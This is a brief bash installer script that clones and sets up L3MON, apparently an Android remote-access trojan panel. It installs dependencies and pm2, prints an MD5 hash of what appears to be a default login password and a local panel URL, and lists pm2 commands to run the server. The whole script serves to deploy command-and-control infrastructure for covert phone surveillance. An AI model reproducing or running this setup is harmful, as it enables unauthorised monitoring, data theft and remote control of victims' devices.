install(){
sudo apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre
git clone https://github.com/efxtv/L3MON.git
cd L3MON
sudo npm install pm2 -g
npm install
npm audit fix
npm audit
echo -n efxtv | openssl md5|awk '{print $2}'
echo 'http://127.0.0.1:22533'
}
install



echo 'pm2 start index.js
pm2 stop index.js
pm2 restart index.js'
